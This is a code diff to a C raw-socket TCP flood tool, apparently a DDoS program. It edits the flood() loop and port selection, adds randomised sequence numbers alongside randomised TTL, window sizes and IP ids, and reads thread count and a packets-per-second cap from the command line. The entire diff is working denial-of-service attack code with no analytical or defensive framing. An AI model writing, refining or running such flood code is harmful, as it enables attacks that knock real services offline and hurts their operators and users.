@@ -185,7 +185,6 @@ void setup_ip_header(struct iphdr *iph)
 }
 
 int sPorts[2] = {80, 443};
-int dPorts[3] = {80, 443};
 int windows[4] = {8192, 65535, 14600, 64240};
 
 void setup_tcp_header(struct tcphdr *tcph)
@@ -298,6 +297,7 @@ void *flood(void *par1)
 		iph->ttl = randnum(64, 255);
 		tcph->window = htons(windows[rand_cmwc() % 4]);
 		iph->id = htonl(rand_cmwc() & 0xFFFF);
+		tcph->seq = htonl(randnum(1000000, 9999999));
 		if (bpgOrDrd == 1)
 		{
 			if (floodport == 0)
@@ -344,16 +344,8 @@ void *flood(void *par1)
 			}
 			else
 			{
-				if (randnum(0, 1) == 1)
-				{
-					tcph->dest = htons(floodport);
-					tcph->source = htons(dPorts[rand_cmwc() % 3]);
-				}
-				else
-				{
-					tcph->source = htons(floodport);
-					tcph->dest = htons(sPorts[rand_cmwc() % 2]);
-				}
+				tcph->source = htons(floodport);
+				tcph->dest = htons(sPorts[rand_cmwc() % 2]);
 			}
 			opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
 			setup_tcpopts_header(opts);
@@ -544,7 +536,6 @@ int main(int argc, char *argv[])
 	buffer = memset(buffer, 0x00, max_len);
 	int num_threads = atoi(argv[3]);
 	floodport = atoi(argv[2]);
-	dPorts[2] = floodport;
 	int maxpps = atoi(argv[4]);
 	limiter = 0;
 	pps = 0;
